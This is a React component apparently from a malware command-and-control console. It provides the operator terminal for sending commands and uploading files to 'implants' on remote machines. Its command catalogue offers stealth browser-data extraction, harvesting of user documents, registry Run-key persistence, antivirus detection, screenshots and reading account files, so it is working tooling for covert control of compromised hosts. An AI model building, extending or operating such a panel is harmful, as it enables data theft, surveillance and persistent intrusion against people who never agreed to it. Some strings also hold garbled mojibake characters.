import React, { useState, useEffect, useRef } from 'react';
import styled from 'styled-components';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism';
import { 
  FiTerminal, 
  FiSend, 
  FiTrash2, 
  FiDownload,
  FiUpload,
  FiCopy,
  FiMaximize2,
  FiMinimize2,
  FiHelpCircle,
  FiX
} from 'react-icons/fi';
import { toast } from 'react-toastify';

const MAX_TERMINAL_HISTORY = 500;

function terminalStorageKey(clientId) {
  return `terminalHistory_${clientId}`;
}

function normalizeLineTimestamp(ts) {
  if (!ts) return new Date();
  if (ts instanceof Date) return ts;
  const d = new Date(ts);
  return Number.isNaN(d.getTime()) ? new Date() : d;
}

/** Best-effort parse of remote working directory from implant output */
function extractRemoteCwd(text) {
  if (!text || typeof text !== 'string') return null;
  const m1 = text.match(/Current directory changed to:\s*([^\r\n]+)/i);
  if (m1) return m1[1].trim();
  const m2 = text.match(/^Directory:\s*([^\r\n]+)/m);
  if (m2) return m2[1].trim();
  const lines = text.trim().split(/\r?\n/).filter(Boolean);
  if (lines.length === 1) {
    const l = lines[0].trim();
    if (/^[A-Za-z]:\\/.test(l) || (l.startsWith('/') && l.length > 1)) return l;
  }
  return null;
}

function buildRemoteUploadPath(cwd, fileName, isLinux = false) {
  const name = (fileName || 'upload.bin').replace(/[<>:"|?*]/g, '_');
  if (!cwd) return name;
  const base = cwd.replace(/[\\/]+$/, '');
  const sep = isLinux || cwd.startsWith('/') ? '/' : '\\';
  return `${base}${sep}${name}`;
}

const TerminalContainer = styled.div`
  height: 100%;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  min-height: 0;
`;

const ToolRow = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
  flex-wrap: wrap;
  padding-bottom: 12px;
  border-bottom: 1px solid #2a3140;
  margin-bottom: 12px;
`;

const ToolLeft = styled.div`
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  align-items: center;
`;

const ToolRight = styled.div`
  display: flex;
  align-items: center;
  gap: 6px;
`;

const HeaderButton = styled.button`
  background: transparent;
  border: 1px solid #2a3140;
  color: #aeb6c7;
  padding: 7px 10px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 12px;
  font-family: inherit;
  font-weight: 500;
  transition: border-color 0.15s, color 0.15s;

  &:hover {
    border-color: #c6f23e;
    color: #c6f23e;
  }
`;

const TerminalBody = styled.div`
  flex: 1;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  min-height: 0;
`;

const OutputArea = styled.div`
  flex: 1;
  padding: 14px 4px;
  overflow-y: auto;
  background: transparent;
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  font-size: 13px;
  line-height: 1.55;
  min-height: 0;
`;

const OutputLine = styled.div`
  margin-bottom: 6px;
  display: flex;
  align-items: flex-start;
  gap: 12px;
  
  &.command {
    color: #c6f23e;
    
    &::before {
      content: '> ';
      color: #5c657a;
    }
  }
  
  &.response {
    color: #c5cad6;
    white-space: pre-wrap;
    word-break: break-word;
  }
  
  &.error {
    color: #ff6b7a;
  }
  
  &.info {
    color: #8b93a7;
  }
`;

const Timestamp = styled.span`
  color: #5c657a;
  font-size: 11px;
  min-width: 72px;
  flex-shrink: 0;
`;

const InputArea = styled.div`
  border-top: 1px solid #2a3140;
  padding: 12px 0 0;
  display: flex;
  align-items: center;
  gap: 10px;
`;

const UploadToolbar = styled.div`
  border-top: 1px solid #2a3140;
  padding: 10px 0;
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 12px;
  font-size: 12px;
  color: #8b93a7;
`;

const UploadPathHint = styled.div`
  flex: 1;
  min-width: 200px;
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  color: #8b93a7;
  word-break: break-all;
`;

const UploadProgressPanel = styled.div`
  padding: 8px 0 10px;
`;

const UploadProgressMeta = styled.div`
  display: flex;
  justify-content: space-between;
  gap: 12px;
  color: #aeb6c7;
  font-size: 12px;
  margin-bottom: 8px;
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
`;

const ProgressTrack = styled.div`
  height: 6px;
  border-radius: 3px;
  background: #1a1f2a;
  border: 1px solid #2a3140;
  overflow: hidden;
`;

const ProgressFill = styled.div`
  height: 100%;
  width: ${props => Math.max(0, Math.min(100, props.$percent || 0))}%;
  background: #c6f23e;
  transition: width 0.15s ease;
`;

const UploadButton = styled.button`
  background: transparent;
  border: 1px solid #2a3140;
  color: #aeb6c7;
  padding: 7px 12px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 12px;
  font-family: inherit;
  font-weight: 500;
  transition: border-color 0.15s, color 0.15s;

  &:hover:not(:disabled) {
    border-color: #c6f23e;
    color: #c6f23e;
  }

  &:disabled {
    opacity: 0.45;
    cursor: not-allowed;
  }
`;

const HiddenFileInput = styled.input`
  display: none;
`;

const CommandInput = styled.input`
  flex: 1;
  background: #161a22;
  border: 1px solid #2a3140;
  color: #eef1f6;
  padding: 12px 14px;
  border-radius: 8px;
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  font-size: 13px;
  outline: none;
  transition: border-color 0.15s;

  &:focus {
    border-color: #c6f23e;
  }

  &::placeholder {
    color: #5c657a;
  }
`;

const SendButton = styled.button`
  background: #c6f23e;
  border: none;
  color: #0e1014;
  padding: 12px 16px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-weight: 700;
  font-family: inherit;
  font-size: 13px;
  transition: background 0.15s;

  &:hover:not(:disabled) {
    background: #d4ff5a;
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

const QuickCommandButton = styled.button`
  background: transparent;
  border: none;
  color: #8b93a7;
  padding: 4px 8px;
  border-radius: 6px;
  font-size: 12px;
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  cursor: pointer;
  transition: color 0.15s, background 0.15s;

  &:hover {
    color: #c6f23e;
    background: rgba(198, 242, 62, 0.08);
  }
`;

const ModalOverlay = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.8);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  animation: fadeIn 0.2s ease-out;

  @keyframes fadeIn {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }
`;

const ModalContent = styled.div`
  background: #1a1a1a;
  border: 1px solid #2a3140;
  border-radius: 12px;
  width: 90%;
  max-width: 900px;
  max-height: 80vh;
  overflow-y: auto;
  animation: slideUp 0.3s ease-out;

  @keyframes slideUp {
    from {
      transform: translateY(20px);
      opacity: 0;
    }
    to {
      transform: translateY(0);
      opacity: 1;
    }
  }
`;

const ModalHeader = styled.div`
  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
  border-bottom: 1px solid #333;
  padding: 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  position: sticky;
  top: 0;
  z-index: 1;

  h2 {
    color: #c6f23e;
    font-size: 20px;
    margin: 0;
    display: flex;
    align-items: center;
    gap: 10px;
  }
`;

const CloseButton = styled.button`
  background: rgba(255, 255, 255, 0.1);
  border: 1px solid #2a3140;
  color: #ccc;
  width: 32px;
  height: 32px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s;

  &:hover {
    background: rgba(255, 107, 107, 0.2);
    border-color: #ff6b6b;
    color: #ff6b6b;
  }
`;

const ModalBody = styled.div`
  padding: 20px;
`;

const CommandSection = styled.div`
  margin-bottom: 30px;

  h3 {
    color: #c6f23e;
    font-size: 16px;
    margin-bottom: 12px;
    padding-bottom: 8px;
    border-bottom: 1px solid #333;
  }
`;

const CommandList = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
  gap: 12px;
`;

const CommandItem = styled.div`
  background: rgba(198, 242, 62, 0.05);
  border: 1px solid #2a3140;
  border-radius: 8px;
  padding: 12px;
  transition: all 0.2s;

  &:hover {
    background: rgba(198, 242, 62, 0.1);
    border-color: #c6f23e;
  }

  .command-name {
    color: #c6f23e;
    font-family: 'Courier New', monospace;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 4px;
  }

  .command-desc {
    color: #888;
    font-size: 12px;
    line-height: 1.4;
  }
`;

const SearchBox = styled.input`
  width: 100%;
  background: #0a0a0a;
  border: 1px solid #2a3140;
  color: #fff;
  padding: 12px 16px;
  border-radius: 8px;
  font-size: 14px;
  margin-bottom: 20px;
  outline: none;
  transition: border-color 0.2s;

  &:focus {
    border-color: #c6f23e;
  }

  &::placeholder {
    color: #666;
  }
`;

const Terminal = ({ client, socket }) => {
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState([]);
  const [isConnected, setIsConnected] = useState(false);
  const [showHelp, setShowHelp] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [remoteCwd, setRemoteCwd] = useState(null);
  const [uploadBusy, setUploadBusy] = useState(false);
  const [uploadProgress, setUploadProgress] = useState(null); // { percent, sent, total, phase, name, remotePath }
  const [historyReady, setHistoryReady] = useState(false);
  const outputRef = useRef(null);
  const inputRef = useRef(null);
  const fileInputRef = useRef(null);
  const socketRef = useRef(socket);
  socketRef.current = socket;

  const isLinux = (() => {
    const os = String(client?.os || '').toLowerCase();
    if (os.includes('linux') || os === 'darwin') return true;
    if (os.includes('windows') || os === 'win32') return false;
    // Fallback from remote path hint if OS not yet known
    if (remoteCwd && remoteCwd.startsWith('/')) return true;
    if (remoteCwd && /^[A-Za-z]:\\/.test(remoteCwd)) return false;
    return false; // default Windows
  })();

  const sharedCommands = {
    'Terminal panel': [
      { name: 'Upload file (button)', desc: 'Pick a file to send to the implant under remote cwd.' },
      { name: 'Session history', desc: 'Command history is saved per session until cleared.' },
      { name: 'Quick commands', desc: 'Shortcut chips show only commands for this OS.' }
    ],
    'File Operations': [
      { name: 'ls', desc: 'List current directory (or ls <path>).' },
      { name: 'cd <path>', desc: 'Change implant working directory.' },
      { name: 'pwd', desc: 'Print implant current directory.' },
      { name: 'download <path>', desc: 'Download a file or folder from the implant.' },
      { name: 'upload <path>', desc: 'Legacy upload path (prefer Upload button).' }
    ],
    'Surveillance': [
      { name: 'screenshot', desc: 'Take a screenshot' },
      { name: 'sysinfo', desc: 'Display hostname, user, OS, architecture' },
      { name: 'whoami', desc: 'Display current user' },
      { name: 'test', desc: 'Test connection' },
      { name: 'q', desc: 'Disconnect client' }
    ]
  };

  const windowsCommands = {
    'Windows System': [
      { name: 'processes', desc: 'List running processes (tasklist)' },
      { name: 'services', desc: 'List Windows services' },
      { name: 'network', desc: 'Display network configuration (ipconfig)' },
      { name: 'antivirus', desc: 'Detect installed antivirus' },
      { name: 'firewall', desc: 'Check Windows Firewall status' },
      { name: 'ipconfig', desc: 'Display IP configuration' },
      { name: 'tasklist', desc: 'List running tasks' },
      { name: 'netstat -an', desc: 'Display network connections' },
      { name: 'hostname', desc: 'Display computer name' },
      { name: 'systeminfo', desc: 'Display system information' },
      { name: 'taskkill /PID <pid>', desc: 'Kill a process' },
      { name: 'sc query', desc: 'Query service status' },
      { name: 'reg query <key>', desc: 'Query registry key' },
      { name: 'dir /s <pattern>', desc: 'Search files recursively' },
      { name: 'net user', desc: 'Display user accounts' },
      { name: 'net localgroup', desc: 'Display local groups' },
      { name: 'wmic product list', desc: 'List installed software' },
      { name: 'gpresult /r', desc: 'Group policy result' }
    ],
    'Windows File Ops': [
      { name: 'dir', desc: 'List directory (Windows style)' }
    ],
    'Windows Browser': [
      { name: 'extractbrowser', desc: 'Extract browser data ZIP' },
      { name: 'extractbrowserhidden', desc: 'Stealth browser extraction' },
      { name: 'browserpaths', desc: 'Show browser file paths' },
      { name: 'harvestdocs', desc: 'Scan Desktop/Downloads/Documents' }
    ],
    'Windows Persistence': [
      { name: 'setpersistence', desc: 'Add exe to HKCU Run registry persistence' },
      { name: 'checkpersistence', desc: 'Check if registry persistence is active' }
    ]
  };

  const linuxCommands = {
    'Linux System': [
      { name: 'uname -a', desc: 'Kernel and system information' },
      { name: 'ps aux', desc: 'List all running processes' },
      { name: 'top -bn1', desc: 'One-shot process snapshot' },
      { name: 'id', desc: 'Current user and group IDs' },
      { name: 'whoami', desc: 'Current username' },
      { name: 'hostname', desc: 'Machine hostname' },
      { name: 'uptime', desc: 'System uptime' },
      { name: 'w', desc: 'Logged-in users' },
      { name: 'last', desc: 'Recent logins' },
      { name: 'env', desc: 'Environment variables' },
      { name: 'history', desc: 'Shell history' }
    ],
    'Linux Network': [
      { name: 'ip a', desc: 'Network interfaces' },
      { name: 'ifconfig', desc: 'Legacy interface config' },
      { name: 'netstat -tulpn', desc: 'Listening ports and connections' },
      { name: 'ss -tulpn', desc: 'Socket statistics' },
      { name: 'lsof -i', desc: 'Open network files' },
      { name: 'route -n', desc: 'Routing table' },
      { name: 'cat /etc/resolv.conf', desc: 'DNS resolvers' }
    ],
    'Linux Disk & Hardware': [
      { name: 'df -h', desc: 'Disk usage' },
      { name: 'free -h', desc: 'Memory usage' },
      { name: 'lscpu', desc: 'CPU information' },
      { name: 'lsblk', desc: 'Block devices' },
      { name: 'mount', desc: 'Mounted filesystems' },
      { name: 'du -sh /*', desc: 'Top-level disk usage' }
    ],
    'Linux Users & Security': [
      { name: 'cat /etc/passwd', desc: 'User accounts' },
      { name: 'cat /etc/group', desc: 'Groups' },
      { name: 'sudo -l', desc: 'Sudo permissions' },
      { name: 'crontab -l', desc: 'User cron jobs' },
      { name: 'systemctl list-units --type=service', desc: 'Systemd services' },
      { name: 'journalctl -n 50', desc: 'Recent system logs' }
    ],
    'Linux File Search': [
      { name: 'find /home -type f 2>/dev/null | head', desc: 'List home files' },
      { name: 'find / -name "*.log" 2>/dev/null | head', desc: 'Find log files' },
      { name: 'ls -la', desc: 'Detailed directory listing' },
      { name: 'cat /etc/os-release', desc: 'Distro release info' }
    ]
  };

  const commandsData = isLinux
    ? { ...sharedCommands, ...linuxCommands }
    : { ...sharedCommands, ...windowsCommands };

  const quickCommands = isLinux
    ? [
        'sysinfo',
        'uname -a',
        'ps aux',
        'id',
        'pwd',
        'ls -la',
        'df -h',
        'free -h',
        'netstat -tulpn',
        'ip a',
        'screenshot',
        'whoami'
      ]
    : [
        'sysinfo',
        'processes',
        'services',
        'network',
        'screenshot',
        'pwd',
        'whoami',
        'ipconfig',
        'tasklist',
        'netstat -an',
        'setpersistence',
        'checkpersistence'
      ];

  // Restore terminal transcript for this client
  useEffect(() => {
    if (!client?.id) return;
    setHistoryReady(false);
    try {
      const raw = localStorage.getItem(terminalStorageKey(client.id));
      if (raw) {
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed) && parsed.length) {
          setOutput(
            parsed.map((line) => ({
              ...line,
              timestamp: normalizeLineTimestamp(line.timestamp)
            }))
          );
        } else {
          setOutput([]);
        }
      } else {
        setOutput([]);
      }
    } catch {
      setOutput([]);
    }
    setHistoryReady(true);
  }, [client?.id]);

  // Persist transcript (cap length) ÔÇö only after history loaded for this client
  useEffect(() => {
    if (!client?.id || !historyReady) return;
    try {
      const capped = output.slice(-MAX_TERMINAL_HISTORY);
      localStorage.setItem(terminalStorageKey(client.id), JSON.stringify(capped));
    } catch (e) {
      console.warn('Terminal history save failed', e);
    }
  }, [output, client?.id, historyReady]);

  // Sync remote cwd once per selected client
  useEffect(() => {
    if (!client) return;
    const t = setTimeout(() => {
      const s = socketRef.current;
      if (!s || !s.connected) return;
      s.emit('executeCommand', { clientId: client.id, command: 'pwd' });
    }, 350);
    return () => clearTimeout(t);
  }, [client?.id]);

  useEffect(() => {
    if (!socket || !client) return;

    const handleCommandResponse = (data) => {
      if (data.clientId === client.id) {
        const text = data.response != null ? String(data.response) : '';
        const inferred = extractRemoteCwd(text);
        if (inferred) setRemoteCwd(inferred);

        if (/upload complete/i.test(text)) {
          setUploadBusy(false);
          setUploadProgress((prev) => prev ? { ...prev, percent: 100, phase: 'done' } : null);
          setTimeout(() => setUploadProgress(null), 1500);
          toast.success('File uploaded to client');
        } else if (/upload failed/i.test(text) || /upload timed out/i.test(text)) {
          setUploadBusy(false);
          setUploadProgress(null);
        }

        setOutput((prev) => [
          ...prev,
          {
            type: 'response',
            content: data.response,
            timestamp: new Date()
          }
        ]);
      }
    };

    const handleCommandSent = (data) => {
      if (data.clientId === client.id) {
        setOutput((prev) => [
          ...prev,
          {
            type: 'command',
            content: data.command,
            timestamp: new Date()
          }
        ]);
      }
    };

    const handleCommandError = (error) => {
      setOutput((prev) => [
        ...prev,
        {
          type: 'error',
          content: `Error: ${error.error}`,
          timestamp: new Date()
        }
      ]);
    };

    const handleUploadErr = (payload) => {
      if (payload && payload.clientId === client.id) {
        toast.error(payload.error || 'Upload failed');
        setUploadBusy(false);
        setUploadProgress(null);
      }
    };

    const handleUploadQueued = (payload) => {
      if (payload && payload.clientId === client.id) {
        toast.info(`Uploading ${payload.size} bytesÔÇª`);
        setUploadProgress({
          percent: 0,
          sent: 0,
          total: payload.size || 0,
          phase: 'waiting',
          remotePath: payload.remotePath || '',
          name: (payload.remotePath || '').split(/[\\/]/).pop() || 'file'
        });
      }
    };

    const handleUploadProgress = (payload) => {
      if (!payload || payload.clientId !== client.id) return;
      setUploadBusy(payload.phase !== 'done' && payload.phase !== 'error');
      setUploadProgress({
        percent: payload.percent || 0,
        sent: payload.sent || 0,
        total: payload.total || 0,
        phase: payload.phase || 'transfer',
        remotePath: payload.remotePath || '',
        name: (payload.remotePath || '').split(/[\\/]/).pop() || 'file',
        error: payload.error
      });
      if (payload.phase === 'done') {
        setTimeout(() => setUploadProgress(null), 1500);
      }
      if (payload.phase === 'error') {
        toast.error(payload.error || 'Upload failed');
        setUploadBusy(false);
        setTimeout(() => setUploadProgress(null), 2000);
      }
    };

    socket.on('commandResponse', handleCommandResponse);
    socket.on('commandSent', handleCommandSent);
    socket.on('commandError', handleCommandError);
    socket.on('uploadError', handleUploadErr);
    socket.on('uploadQueued', handleUploadQueued);
    socket.on('uploadProgress', handleUploadProgress);

    setIsConnected(true);

    return () => {
      socket.off('commandResponse', handleCommandResponse);
      socket.off('commandSent', handleCommandSent);
      socket.off('commandError', handleCommandError);
      socket.off('uploadError', handleUploadErr);
      socket.off('uploadQueued', handleUploadQueued);
      socket.off('uploadProgress', handleUploadProgress);
    };
  }, [socket, client]);

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  const handleSendCommand = () => {
    if (!command.trim() || !socket || !client) return;

    socket.emit('executeCommand', {
      clientId: client.id,
      command: command.trim()
    });

    setCommand('');
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      handleSendCommand();
    }
  };

  const handleQuickCommand = (cmd) => {
    setCommand(cmd);
    if (inputRef.current) {
      inputRef.current.focus();
    }
  };

  const handleUploadPick = () => {
    if (!socket || !client || uploadBusy) return;
    if (fileInputRef.current) fileInputRef.current.click();
  };

  const formatBytes = (n) => {
    const v = Number(n) || 0;
    if (v < 1024) return `${v} B`;
    if (v < 1024 * 1024) return `${(v / 1024).toFixed(1)} KB`;
    return `${(v / (1024 * 1024)).toFixed(1)} MB`;
  };

  const handleFileSelected = (e) => {
    const file = e.target.files && e.target.files[0];
    if (!file || !socket || !client) return;
    setUploadBusy(true);
    setUploadProgress({
      percent: 0,
      sent: 0,
      total: file.size || 0,
      phase: 'reading',
      name: file.name,
      remotePath: ''
    });
    const reader = new FileReader();
    reader.onprogress = (ev) => {
      if (!ev.lengthComputable) return;
      const percent = Math.round((ev.loaded / ev.total) * 100);
      setUploadProgress((prev) => ({
        ...(prev || {}),
        percent,
        sent: ev.loaded,
        total: ev.total,
        phase: 'reading',
        name: file.name
      }));
    };
    reader.onload = () => {
      try {
        const res = reader.result;
        const str = String(res);
        const comma = str.indexOf(',');
        const base64 = comma >= 0 ? str.slice(comma + 1) : str;
        const remotePath = buildRemoteUploadPath(remoteCwd, file.name, isLinux);
        setUploadProgress((prev) => ({
          ...(prev || {}),
          percent: 0,
          sent: 0,
          total: file.size || 0,
          phase: 'waiting',
          name: file.name,
          remotePath
        }));
        if (base64.length > 120 * 1024 * 1024) {
          throw new Error('File too large for upload channel (max ~90 MB)');
        }
        socket.emit('uploadBinaryToClient', { clientId: client.id, remotePath, fileBase64: base64 });
      } catch (err) {
        toast.error(err.message || 'Upload prepare failed');
        setUploadBusy(false);
        setUploadProgress(null);
      }
      e.target.value = '';
    };
    reader.onerror = () => {
      toast.error('Could not read file');
      setUploadBusy(false);
      setUploadProgress(null);
      e.target.value = '';
    };
    reader.readAsDataURL(file);
  };

  const clearOutput = () => {
    setOutput([]);
    if (client?.id) {
      try {
        localStorage.removeItem(terminalStorageKey(client.id));
      } catch {
        /* ignore */
      }
    }
  };

  const copyOutput = () => {
    const text = output.map(line =>
      `[${normalizeLineTimestamp(line.timestamp).toLocaleTimeString()}] ${line.type === 'command' ? '>' : ''} ${line.content}`
    ).join('\n');

    navigator.clipboard.writeText(text);
    toast.success('Output copied to clipboard');
  };

  const filterCommands = () => {
    if (!searchTerm.trim()) return commandsData;

    const filtered = {};
    Object.keys(commandsData).forEach(category => {
      const matches = commandsData[category].filter(cmd =>
        cmd.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
        cmd.desc.toLowerCase().includes(searchTerm.toLowerCase())
      );
      if (matches.length > 0) {
        filtered[category] = matches;
      }
    });
    return filtered;
  };

  const filteredCommands = filterCommands();

  if (!client) {
    return (
      <TerminalContainer>
        <div style={{ color: '#8b93a7', padding: '24px 0' }}>
          Select a session to open the terminal
        </div>
      </TerminalContainer>
    );
  }

  return (
    <TerminalContainer>
      <ToolRow>
        <ToolLeft>
          {quickCommands.map((cmd, index) => (
            <QuickCommandButton
              key={index}
              onClick={() => handleQuickCommand(cmd)}
            >
              {cmd}
            </QuickCommandButton>
          ))}
        </ToolLeft>
        <ToolRight>
          <HeaderButton onClick={() => setShowHelp(true)}>
            <FiHelpCircle size={14} />
            Help
          </HeaderButton>
          <HeaderButton onClick={copyOutput}>
            <FiCopy size={14} />
            Copy
          </HeaderButton>
          <HeaderButton onClick={clearOutput}>
            <FiTrash2 size={14} />
            Clear
          </HeaderButton>
        </ToolRight>
      </ToolRow>

      {showHelp && (
        <ModalOverlay onClick={() => setShowHelp(false)}>
          <ModalContent onClick={(e) => e.stopPropagation()}>
            <ModalHeader>
              <h2>
                <FiHelpCircle />
                {isLinux ? 'Linux Commands' : 'Windows Commands'}
              </h2>
              <CloseButton onClick={() => setShowHelp(false)}>
                <FiX />
              </CloseButton>
            </ModalHeader>
            <ModalBody>
              <SearchBox
                type="text"
                placeholder="Search commands..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
              
              {Object.keys(filteredCommands).length === 0 ? (
                <div style={{ color: '#666', textAlign: 'center', padding: '40px' }}>
                  No commands found matching "{searchTerm}"
                </div>
              ) : (
                Object.keys(filteredCommands).map((category) => (
                  <CommandSection key={category}>
                    <h3>{category}</h3>
                    <CommandList>
                      {filteredCommands[category].map((cmd, index) => (
                        <CommandItem key={index} onClick={() => {
                          setCommand(cmd.name.replace(/<.*?>/g, ''));
                          setShowHelp(false);
                          if (inputRef.current) {
                            inputRef.current.focus();
                          }
                        }}>
                          <div className="command-name">{cmd.name}</div>
                          <div className="command-desc">{cmd.desc}</div>
                        </CommandItem>
                      ))}
                    </CommandList>
                  </CommandSection>
                ))
              )}
            </ModalBody>
          </ModalContent>
        </ModalOverlay>
      )}

      <TerminalBody>
        <OutputArea ref={outputRef}>
          {output.length === 0 ? (
            <div style={{ color: '#5c657a' }}>
              Ready ÔÇö type a command or pick one above.
            </div>
          ) : (
            output.map((line, index) => (
              <OutputLine key={`${index}-${normalizeLineTimestamp(line.timestamp).getTime()}`} className={line.type}>
                <Timestamp>
                  {normalizeLineTimestamp(line.timestamp).toLocaleTimeString()}
                </Timestamp>
                <div>{line.content}</div>
              </OutputLine>
            ))
          )}
        </OutputArea>

        <UploadToolbar>
          <UploadButton type="button" onClick={handleUploadPick} disabled={!isConnected || uploadBusy}>
            <FiUpload />
            {uploadBusy ? 'UploadingÔÇª' : 'Upload'}
          </UploadButton>
          <HiddenFileInput
            ref={fileInputRef}
            type="file"
            onChange={handleFileSelected}
            disabled={uploadBusy}
          />
          <UploadPathHint title="Uses the same working directory as cd / pwd on the implant">
            {remoteCwd
              ? `ÔåÆ ${remoteCwd}${isLinux || remoteCwd.startsWith('/') ? '/' : '\\'}<filename>`
              : 'ÔåÆ run pwd or cd to set upload folder'}
          </UploadPathHint>
        </UploadToolbar>

        {uploadProgress && (
          <UploadProgressPanel>
            <UploadProgressMeta>
              <span>
                {uploadProgress.phase === 'reading' && 'Reading fileÔÇª'}
                {uploadProgress.phase === 'waiting' && 'Waiting for implantÔÇª'}
                {uploadProgress.phase === 'transfer' && 'UploadingÔÇª'}
                {uploadProgress.phase === 'done' && 'Upload complete'}
                {uploadProgress.phase === 'error' && 'Upload failed'}
                {' ÔÇö '}
                {uploadProgress.name || 'file'}
              </span>
              <span>
                {uploadProgress.percent}%
                {uploadProgress.total > 0 ? ` ┬À ${formatBytes(uploadProgress.sent)} / ${formatBytes(uploadProgress.total)}` : ''}
              </span>
            </UploadProgressMeta>
            <ProgressTrack>
              <ProgressFill $percent={uploadProgress.percent} />
            </ProgressTrack>
          </UploadProgressPanel>
        )}

        <InputArea>
          <CommandInput
            ref={inputRef}
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            onKeyPress={handleKeyPress}
            placeholder="Enter commandÔÇª"
            disabled={!isConnected}
          />
          <SendButton
            onClick={handleSendCommand}
            disabled={!command.trim() || !isConnected}
          >
            <FiSend />
            Send
          </SendButton>
        </InputArea>
      </TerminalBody>
    </TerminalContainer>
  );
};

export default Terminal;
